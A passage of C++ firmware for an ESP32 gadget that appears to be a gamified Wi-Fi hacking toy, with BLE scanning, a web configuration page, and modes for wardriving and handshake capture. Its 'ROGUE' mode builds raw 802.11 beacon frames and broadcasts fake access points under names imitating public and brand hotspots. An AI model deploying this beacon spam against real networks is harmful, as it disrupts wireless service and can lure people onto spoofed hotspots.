        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .passive = 0,
        .filter_duplicates = 1
    };
    
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 30000, &discParams, bleScanCb, NULL);
    
    if (rc == 0) {
        _bleScanning = true;
        ESP_LOGI(TAG, "BLE scan started successfully");
    } else {
        ESP_LOGE(TAG, "BLE scan failed to start: %d", rc);
    }
}

void stopBLEScan() {
    if (!_bleScanning) return;
    
    ble_gap_disc_cancel();
    _bleScanning = false;
    ESP_LOGI(TAG, "BLE scan stopped, found %d devices", (int)_bleDevices.size());
}

static TaskHandle_t _beaconTaskHandle = nullptr;
static TaskHandle_t _configTaskHandle = nullptr;
static httpd_handle_t _httpServer = nullptr;
static esp_netif_t* _ap_netif_handle = nullptr;  // Shared AP netif handle for CONFIG/ROGUE modes

static const char* ROGUE_SSIDS[] = {
    "Free_WiFi", "Airport_WiFi", "Hotel_WiFi", "Coffee_Shop", "Starbucks",
    "McDonalds", "Library_WiFi", "School_Network", "Office_Guest", "Conference",
    "Neighbor_WiFi", "Linksys", "NETGEAR", "TP-Link", "Default",
    "XFINITY", "ATT_WiFi", "Verizon_WiFi", "Cafe_Free", "Public_WiFi"
};

static void sendBeaconFrame(const char* ssid, const uint8_t* bssid, uint8_t channel) {
    uint8_t beacon[128];
    memset(beacon, 0, sizeof(beacon));
    
    beacon[0] = 0x80;
    beacon[1] = 0x00;
    beacon[2] = 0x00;
    beacon[3] = 0x00;
    memset(&beacon[4], 0xFF, 6);
    memcpy(&beacon[10], bssid, 6);
    memcpy(&beacon[16], bssid, 6);
    beacon[18] = 0x00;
    beacon[19] = 0x00;
    
    uint64_t timestamp = GetHAL().millis() * 1000;
    for (int i = 0; i < 8; i++) {
        beacon[20 + i] = (timestamp >> (i * 8)) & 0xFF;
    }
    beacon[28] = 0x64;
    beacon[29] = 0x00;
    beacon[30] = 0x01;
    beacon[31] = 0x01;
    
    int pos = 32;
    beacon[pos++] = 0x00;
    beacon[pos++] = strlen(ssid);
    memcpy(&beacon[pos], ssid, strlen(ssid));
    pos += strlen(ssid);
    
    beacon[pos++] = 0x01;
    beacon[pos++] = 4;
    beacon[pos++] = 0x82;
    beacon[pos++] = 0x84;
    beacon[pos++] = 0x8B;
    beacon[pos++] = 0x96;
    
    beacon[pos++] = 0x03;
    beacon[pos++] = 1;
    beacon[pos++] = channel;
    
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
}

static void beaconTask(void* param) {
    (void)param;
    ESP_LOGI(TAG, "Beacon spam task started");
    
    uint32_t beaconCount = 0;
    uint32_t lastLog = GetHAL().millis();
    
    uint8_t bssids[5][6];
    for (int i = 0; i < 5; i++) {
        bssids[i][0] = 0x00;
        bssids[i][1] = 0x11;
        bssids[i][2] = 0x22;
        bssids[i][3] = 0x33;
        bssids[i][4] = 0x44 + i;
        bssids[i][5] = (uint8_t)(esp_random() & 0xFF);
    }
    
    // Fixed channel 6 - no hopping (like PORKCHOP BACON mode)
    uint8_t channel = 6;
    
    while (_beaconSpamming) {
        // Send batch of fake AP beacons
        for (int i = 0; i < 5 && _beaconSpamming; i++) {
            sendBeaconFrame(ROGUE_SSIDS[(beaconCount + i) % 20], bssids[i], channel);
            beaconCount++;
            vTaskDelay(pdMS_TO_TICKS(100));  // 100ms between beacons (balanced rate)
        }
        
        vTaskDelay(pdMS_TO_TICKS(200));
        
        if (GetHAL().millis() - lastLog > 5000) {
            ESP_LOGI(TAG, "Beacons sent: %u on CH%d", beaconCount, channel);
            lastLog = GetHAL().millis();
        }
    }
    
    ESP_LOGI(TAG, "Beacon spam stopped, sent %u frames", beaconCount);
    _beaconSpamming = false;
    vTaskDelete(NULL);
}

void startRogue() {
    if (_beaconSpamming) return;
    
    ESP_LOGI(TAG, "Starting ROGUE mode - beacon spam");
    ESP_LOGW(TAG, "WARNING: Educational use only!");
    
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));
    
    // Only init if not already done - handle case where event loop exists
    static bool netif_initialized = false;
    static bool ap_netif_created = false;
    
    if (!netif_initialized) {
        esp_err_t err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "esp_netif_init failed: %d", err);
        }
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "esp_event_loop_create_default failed: %d", err);
        }
        
        netif_initialized = true;
    }
    
    // Try to get existing AP netif first (handles case from CONFIG mode or previous ROGUE run)
    if (!_ap_netif_handle) {
        _ap_netif_handle = esp_netif_get_default_netif();
    }
    
    // If still no handle, try to create one
    if (!_ap_netif_handle) {
        _ap_netif_handle = esp_netif_create_default_wifi_ap();
        if (_ap_netif_handle) {
            ap_netif_created = true;
            ESP_LOGI(TAG, "AP netif created");
        }
    } else {
        ESP_LOGI(TAG, "Using existing AP netif");
        ap_netif_created = true;
    }
    
    // Re-init WiFi to ensure clean state
    esp_wifi_deinit();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi init failed: %d", ret);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(200));
    
    ret = esp_wifi_set_mode(WIFI_MODE_AP);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi AP mode failed: %d", ret);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Set channel 6 (standard, less congested)
    ret = esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi channel set failed: %d", ret);
    }
    vTaskDelay(pdMS_TO_TICKS(100));
    
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi start failed: %d", ret);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(500));
    
    _wifiInitialized = true;
    _beaconSpamming = true;
    xTaskCreate(beaconTask, "beacon_task", 4096, NULL, 5, &_beaconTaskHandle);
    
    ESP_LOGI(TAG, "ROGUE mode active - ready to send beacons");
}

void stopRogue() {
    if (!_beaconSpamming) return;
    
    _beaconSpamming = false;
    
    if (_beaconTaskHandle) {
        vTaskDelay(pdMS_TO_TICKS(100));
        _beaconTaskHandle = nullptr;
    }
    
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    ESP_LOGI(TAG, "ROGUE mode stopped");
}

static esp_err_t root_handler(httpd_req_t* req) {
    const char* html = 
        "<!DOCTYPE html><html>"
        "<head><title>StackChan-Gotchi</title>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<style>"
        "body{font-family:Arial;margin:0;background:#1a1a2e;color:#eee;font-size:14px}"
        "h1{color:#00ff88;text-align:center;margin:10px 0;font-size:20px}"
        ".nav{display:flex;background:#0f3460;padding:5px}"
        ".nav button{flex:1;padding:10px;background:#16213e;color:#888;border:none;font-weight:bold}"
        ".nav button.active{background:#00ff88;color:#000}"
        ".page{display:none}.page.active{display:block}"
        ".card{background:#16213e;padding:12px;margin:10px;border-radius:8px}"
        "select{padding:10px;margin:5px 0;width:100%;background:#0f3460;color:#fff;border:1px solid #00ff88;border-radius:4px}"
        "button{background:#00ff88;color:#000;padding:10px;border:none;border-radius:5px;cursor:pointer;width:100%;font-weight:bold;margin:5px 0}"
        "button:hover{background:#00cc6a}"
        "button.danger{background:#ff6b6b;color:#fff}"
        "button.secondary{background:#4a4a8a;color:#fff}"
        "p{color:#aaa;margin:5px 0}.value{color:#00ff88;font-weight:bold}"
        "table{width:100%;border-collapse:collapse;margin:10px 0}"
        "td,th{padding:8px;text-align:left;border-bottom:1px solid #333}"
        "th{color:#00ff88}"
        "#message{text-align:center;padding:10px;border-radius:4px;display:none;margin:10px}"
        ".success{background:#00ff8833;color:#00ff88}"
        ".error{background:#ff000033;color:#ff4444}"
        "</style></head>"
        "<body>"
        "<h1>StackChan-Gotchi</h1>"
        "<div class='nav'>"
        "  <button id='btnConfig' class='active' onclick=\"showPage('config')\">Config</button>"
        "  <button id='btnStats' onclick=\"showPage('stats')\">Stats</button>"
        "  <button id='btnNetworks' onclick=\"showPage('networks')\">Networks</button>"
        "  <button id='btnFiles' onclick=\"showPage('files')\">Files</button>"
        "</div>"
        "<div id='message'></div>"
        
        "<!-- CONFIG PAGE -->"
        "<div id='pageConfig' class='page active'>"
        "  <div class='card'>"
        "    <p>Current: <span class='value' id='currentMode'>Loading...</span></p>"
        "    <p>Level: <span class='value' id='level'>-</span> | XP: <span class='value' id='xp'>-</span> | Nets: <span class='value' id='networks'>-</span></p>"
        "  </div>"
        "  <div class='card'>"
        "    <p><strong>Mode Selection</strong></p>"
        "    <select id='mode'>"
        "      <option value='IDLE'>IDLE - Resting</option>"
        "      <option value='SCOUT'>SCOUT - WiFi Scan</option>"
        "      <option value='HUNT'>HUNT - Promiscuous</option>"
        "      <option value='WARDIVE'>WARDIVE - Wardriving</option>"
        "      <option value='SPECTRUM'>SPECTRUM - Spectrum</option>"
        "      <option value='BLE_SCAN'>BLE_SCAN - Bluetooth</option>"
        "      <option value='ROGUE'>ROGUE - Beacon Spam</option>"
        "      <option value='STATS'>STATS - Statistics</option>"
        "      <option value='CONFIG'>CONFIG - This Page</option>"
        "    </select>"
        "    <button onclick='saveConfig()'>Apply Mode</button>"
        "  </div>"
        "  <div class='card'>"
        "    <p><strong>Quick Actions</strong></p>"
        "    <button class='danger' onclick='stopRogue()'>Stop Rogue Mode</button>"
        "    <button class='secondary' onclick='restartAP()'>Restart AP</button>"
        "  </div>"
        "</div>"
        
        "<!-- STATS PAGE -->"
        "<div id='pageStats' class='page'>"
        "  <div class='card'>"
        "    <p><strong>Player Stats</strong></p>"
        "    <table>"
        "      <tr><td>Level</td><td class='value' id='statsLevel'>-</td></tr>"
        "      <tr><td>XP</td><td class='value' id='statsXP'>-</td></tr>"
        "      <tr><td>Networks</td><td class='value' id='statsNetworks'>-</td></tr>"
        "      <tr><td>Handshakes</td><td class='value' id='statsHS'>-</td></tr>"
        "      <tr><td>Prestige</td><td class='value' id='statsPrestige'>-</td></tr>"
        "      <tr><td>Uptime</td><td class='value' id='statsUptime'>-</td></tr>"
        "      <tr><td>Achievements</td><td class='value' id='statsAch'>-</td></tr>"
        "    </table>"
        "  </div>"
        "  <div class='card'>"
        "    <p><strong>Session Stats</strong></p>"
        "    <p>Session XP: <span class='value' id='sessionXP'>-</span></p>"
        "    <p>Session Time: <span class='value' id='sessionTime'>-</span></p>"
        "  </div>"
        "</div>"
        
        "<!-- NETWORKS PAGE -->"
        "<div id='pageNetworks' class='page'>"
        "  <div class='card'>"
        "    <p><strong>Discovered Networks</strong></p>"
        "    <div id='networkList'>Loading...</div>"
        "  </div>"
        "</div>"
        
        "<!-- FILES PAGE -->"
        "<div id='pageFiles' class='page'>"
        "  <div class='card'>"
        "    <p><strong>Internal Storage</strong></p>"
        "    <p>Mount: <span class='value'>/sdcard</span> (Internal Flash)</p>"
        "    <p>Free: <span class='value' id='storageFree'>Loading...</span></p>"
        "    <p>Total: <span class='value'>~2MB</span></p>"
        "  </div>"
        "  <div class='card'>"
        "    <p><strong>Note</strong></p>"
        "    <p style='font-size:12px;color:#888'>"
        "    SD card unavailable on CoreS3 (hardware pin conflict).<br>"
        "    Using internal flash FATFS partition.<br>"
        "    Files stored: config.json, networks.json, wardriving.csv, handshakes/, logs/"
        "    </p>"
        "  </div>"
        "</div>"
        
        "<script>"
        "var currentPage='config';"
        "function showPage(p){"
        "  currentPage=p;"
        "  document.querySelectorAll('.page').forEach(function(x){x.classList.remove('active')});"
        "  document.querySelectorAll('.nav button').forEach(function(x){x.classList.remove('active')});"
        "  document.getElementById('page'+p.charAt(0).toUpperCase()+p.slice(1)).classList.add('active');"
        "  document.getElementById('btn'+p.charAt(0).toUpperCase()+p.slice(1)).classList.add('active');"
        "}"
        "function showMessage(msg,isError){"
        "  var m=document.getElementById('message');m.textContent=msg;m.className=isError?'error':'success';m.style.display='block';"
        "  setTimeout(function(){m.style.display='none'},3000);"
        "}"
        "function saveConfig(){"
        "  fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},"
        "  body:JSON.stringify({mode:document.getElementById('mode').value})})"
        "  .then(function(r){return r.json()}).then(function(d){showMessage('Mode: '+d.mode,false);updateStats();})"
        "  .catch(function(e){showMessage('Error: '+e,true)});"
        "}"
        "function stopRogue(){fetch('/api/rogue',{method:'POST'}).then(function(){showMessage('Rogue stopped',false)}).catch(function(){});}"
        "function restartAP(){location.reload();}"
        "function updateStats(){"
        "  fetch('/api/stats').then(function(r){return r.json()}).then(function(d){"
        "    document.getElementById('currentMode').textContent=d.mode;"
        "    document.getElementById('level').textContent=d.level;"
        "    document.getElementById('xp').textContent=d.xp;"
        "    document.getElementById('networks').textContent=d.networks;"
        "    var ms=document.getElementById('mode').options;"
        "    for(var i=0;i<ms.length;i++){if(ms[i].value===d.mode){ms[i].selected=true;break;}}"
        "    document.getElementById('statsLevel').textContent=d.level;"
        "    document.getElementById('statsXP').textContent=d.xp;"
        "    document.getElementById('statsNetworks').textContent=d.networks;"
        "    document.getElementById('statsHS').textContent=d.handshakes;"
        "    document.getElementById('statsPrestige').textContent=d.prestige;"
        "    document.getElementById('statsUptime').textContent=d.uptime;"
        "    document.getElementById('statsAch').textContent=d.achievements+'/17';"
        "    document.getElementById('sessionXP').textContent='+'+d.sessionXP;"
        "    document.getElementById('sessionTime').textContent=d.sessionTime;"
        "    var nl=document.getElementById('networkList');"
        "    if(d.networksList && d.networksList.length>0){"
        "      nl.innerHTML='<table><tr><th>SSID</th><th>Ch</th><th>dBm</th></tr>'+"
        "      d.networksList.map(function(n){return '<tr><td>'+n.ssid+'</td><td>'+n.ch+'</td><td>'+n.rssi+'</td></tr>'}).join('')+'</table>';"
        "    }else{nl.innerHTML='<p>No networks</p>';}"
        "  }).catch(function(){});"
        "  fetch('/api/files').then(function(r){return r.json()}).then(function(f){"
        "    var freeKB=Math.floor(f.freeSpace/1024);"
        "    document.getElementById('storageFree').textContent=freeKB+' KB';"
        "  }).catch(function(){});"
        "}"
        "setInterval(updateStats,3000);"
        "updateStats();"
        "</script></body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

static esp_err_t api_config_handler(httpd_req_t* req) {
    if (req->method == HTTP_GET) {
        Stats s = getStats();
        char json[256];
        snprintf(json, sizeof(json), 
            "{\"mode\":\"%s\",\"level\":%d,\"xp\":%d,\"apActive\":%s}",
            getModeName(getCurrentMode()),
            (int)s.level,
            (int)s.xp,
            isConfigMode() ? "true" : "false");
        httpd_resp_set_type(req, "application/json");
        httpd_resp_send(req, json, strlen(json));
    } else {
        // POST - read body
        char content[256];
        int ret = httpd_req_recv(req, content, sizeof(content) - 1);
        if (ret > 0) {
            content[ret] = '\0';
            // Simple parse - look for mode value
            char* modeStart = strstr(content, "\"mode\"");
            if (modeStart) {
                char* colon = strchr(modeStart, ':');
                if (colon) {
                    char* quote = strchr(colon, '\"');
                    if (quote) {
                        char* endQuote = strchr(quote + 1, '\"');
                        if (endQuote) {
                            *endQuote = '\0';
                            Mode newMode = Mode::IDLE;
                            if (strcmp(quote + 1, "SCOUT") == 0) newMode = Mode::SCOUT;
                            else if (strcmp(quote + 1, "HUNT") == 0) newMode = Mode::HUNT;
                            else if (strcmp(quote + 1, "WARDIVE") == 0) newMode = Mode::WARDIVE;
                            else if (strcmp(quote + 1, "SPECTRUM") == 0) newMode = Mode::SPECTRUM;
                            else if (strcmp(quote + 1, "BLE_SCAN") == 0) newMode = Mode::BLE_SCAN;
                            else if (strcmp(quote + 1, "ROGUE") == 0) newMode = Mode::ROGUE;
                            else if (strcmp(quote + 1, "STATS") == 0) newMode = Mode::STATS;
                            else if (strcmp(quote + 1, "IDLE") == 0) newMode = Mode::IDLE;
                            setMode(newMode);
                            
                            char resp[128];
                            snprintf(resp, sizeof(resp), "{\"status\":\"ok\",\"mode\":\"%s\"}", getModeName(newMode));
                            httpd_resp_set_type(req, "application/json");
                            httpd_resp_send(req, resp, strlen(resp));
                            return ESP_OK;
                        }
                    }
                }
            }
        }
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid request");
    }
    return ESP_OK;
}

static esp_err_t api_stats_handler(httpd_req_t* req) {
    Stats s = getStats();
    std::vector<NetworkInfo> networks = getNetworks();
    
    // Build networks list JSON
    char networksJson[1024] = "[";
    int count = 0;
    for (const auto& n : networks) {
        if (count > 0) strcat(networksJson, ",");
        char entry[128];
        snprintf(entry, sizeof(entry), "{\"ssid\":\"%.20s\",\"ch\":%d,\"rssi\":%d}",
            n.ssid, n.channel, (int)n.rssi);
        strcat(networksJson, entry);
        count++;
        if (count >= 20) break;  // Limit to 20 networks
    }
    strcat(networksJson, "]");
    
    uint32_t sessionTime = (GetHAL().millis() - s.sessionStartTime) / 1000;
    uint32_t sessionMins = sessionTime / 60;
    uint32_t sessionSecs = sessionTime % 60;
    
    char json[2048];
    snprintf(json, sizeof(json),
        "{\"mode\":\"%s\",\"level\":%d,\"xp\":%d,\"networks\":%u,"
        "\"rogue\":%s,\"config\":%s,\"heap\":%u,"
        "\"handshakes\":%u,\"prestige\":%u,\"uptime\":\"%02uh%02um\","
        "\"achievements\":%u,\"sessionXP\":%d,\"sessionTime\":\"%02u:%02u\","
        "\"sessionNetworks\":%u,\"networksList\":%s}",
        getModeName(getCurrentMode()),
        (int)s.level,
        (int)s.xp,
        (unsigned int)networks.size(),
        isBeaconSpamming() ? "true" : "false",
        isConfigMode() ? "true" : "false",
        (unsigned int)esp_get_free_heap_size(),
        (unsigned int)s.handshakesCaptured,
        (unsigned int)s.prestige,
        (unsigned int)(s.uptimeSeconds / 3600),
        (unsigned int)((s.uptimeSeconds % 3600) / 60),
        (unsigned int)s.achievementCount,
        (int)s.sessionXPGain,
        (unsigned int)sessionMins, (unsigned int)sessionSecs,
        (unsigned int)s.sessionNetworks,
        networksJson);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json, strlen(json));
    return ESP_OK;
}

static esp_err_t api_rogue_handler(httpd_req_t* req) {
    if (isBeaconSpamming()) {
        stopRogue();
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, "{\"status\":\"stopped\"}", 18);
    return ESP_OK;
}

static esp_err_t api_files_handler(httpd_req_t* req) {
    // Return basic storage info
    char json[512];
    int64_t freeSpace = gotchi::getStorageFreeSpace();
    int64_t totalSpace = 2 * 1024 * 1024;  // ~2MB estimate
    
    snprintf(json, sizeof(json),
        "{\"freeSpace\":%lld,\"totalSpace\":%lld,\"mountPoint\":\"%s\"}",
        (long long)freeSpace, (long long)totalSpace, "/sdcard");
    
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, json, strlen(json));
    return ESP_OK;
}

static void startHttpServer() {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.stack_size = 4096;
    
    httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = root_handler, .user_ctx = nullptr};
    httpd_uri_t api_config_uri = {.uri = "/api/config", .method = HTTP_GET, .handler = api_config_handler, .user_ctx = nullptr};
    httpd_uri_t api_config_post_uri = {.uri = "/api/config", .method = HTTP_POST, .handler = api_config_handler, .user_ctx = nullptr};
    httpd_uri_t api_stats_uri = {.uri = "/api/stats", .method = HTTP_GET, .handler = api_stats_handler, .user_ctx = nullptr};
    httpd_uri_t api_rogue_uri = {.uri = "/api/rogue", .method = HTTP_POST, .handler = api_rogue_handler, .user_ctx = nullptr};
    httpd_uri_t api_files_uri = {.uri = "/api/files", .method = HTTP_GET, .handler = api_files_handler, .user_ctx = nullptr};
    
    if (httpd_start(&_httpServer, &config) == ESP_OK) {
        httpd_register_uri_handler(_httpServer, &root_uri);
        httpd_register_uri_handler(_httpServer, &api_config_uri);
        httpd_register_uri_handler(_httpServer, &api_config_post_uri);
        httpd_register_uri_handler(_httpServer, &api_stats_uri);
        httpd_register_uri_handler(_httpServer, &api_rogue_uri);
        httpd_register_uri_handler(_httpServer, &api_files_uri);
        ESP_LOGI(TAG, "HTTP server started with API endpoints");
    } else {
        ESP_LOGW(TAG, "HTTP server failed");
    }
}

static void configModeTask(void* param) {
    (void)param;
    ESP_LOGI(TAG, "Config mode starting...");
    vTaskDelay(pdMS_TO_TICKS(500));
    startHttpServer();
    ESP_LOGI(TAG, "Config mode ready - visit http://192.168.4.1");
    while (_configModeActive) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
    vTaskDelete(NULL);
}

void startConfigMode() {
    if (_configModeActive) return;
    
    ESP_LOGI(TAG, "Starting CONFIG mode");
    
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(200));
    
    // Only init if not already done - handle case where event loop exists
    // Note: netif_initialized is shared with startRogue
    static bool netif_initialized = false;
    static bool ap_netif_created = false;
    if (!netif_initialized) {
        esp_err_t err = esp_netif_init();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "esp_netif_init failed: %d", err);
        }
        
        err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "esp_event_loop_create_default failed: %d", err);
        }
        
        netif_initialized = true;
    }
    
    // Try to get existing AP netif first (handles case from ROGUE mode)
    if (!_ap_netif_handle) {
        _ap_netif_handle = esp_netif_get_default_netif();
    }
    
    // If still no handle, try to create one
    if (!_ap_netif_handle) {
        _ap_netif_handle = esp_netif_create_default_wifi_ap();
        if (_ap_netif_handle) {
            ap_netif_created = true;
            ESP_LOGI(TAG, "AP netif created for CONFIG");
        }
    } else {
        ESP_LOGI(TAG, "Using existing AP netif for CONFIG");
        ap_netif_created = true;
    }
    
    // Re-init WiFi to ensure clean state
    esp_wifi_deinit();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi init failed: %d", ret);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(200));
    
    ret = esp_wifi_set_mode(WIFI_MODE_AP);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi AP mode failed: %d", ret);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Set channel before config
    ret = esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi channel set failed: %d", ret);
    }
    
    wifi_config_t ap_config = {};
    strcpy((char*)ap_config.ap.ssid, "StackChan-Config");
    ap_config.ap.ssid_len = 16;
    ap_config.ap.channel = 6;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "AP config failed: %d", ret);
    }
    
    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "WiFi start failed: %d", ret);
        return;
    }
    
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    _wifiInitialized = true;
    _configModeActive = true;
    xTaskCreate(configModeTask, "config_task", 4096, NULL, 5, &_configTaskHandle);
    
    ESP_LOGI(TAG, "CONFIG mode active - connect to 'StackChan-Config'");
}

void stopConfigMode() {
    if (!_configModeActive) return;
    
    _configModeActive = false;
    
    if (_configTaskHandle) {
        vTaskDelay(pdMS_TO_TICKS(100));
        _configTaskHandle = nullptr;
    }
    
    if (_httpServer) {
        httpd_stop(_httpServer);
        _httpServer = nullptr;
    }
    
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    ESP_LOGI(TAG, "CONFIG mode stopped");
}

bool isBeaconSpamming() {
    return _beaconSpamming;
}

bool isConfigMode() {
    return _configModeActive;
}

bool shouldShowHuntDisclaimer() {
    static bool shown = false;
    return !shown;
}

void acknowledgeHuntDisclaimer() {
    // Implementation - disclaimer has been shown
}

bool isDeepThoughtUnlocked() {
    return _xpSystem.getLevel() >= 5;
}

uint32_t getAchievementsBitmask() {
    return _achievementSystem.getAchievementsBitmask();
}

bool getDailyChallenge(ChallengeInfo& challenge) {
    return _achievementSystem.getDailyChallenge(challenge);
}

bool completeDailyChallenge() {
    return _achievementSystem.completeDailyChallenge();
}

}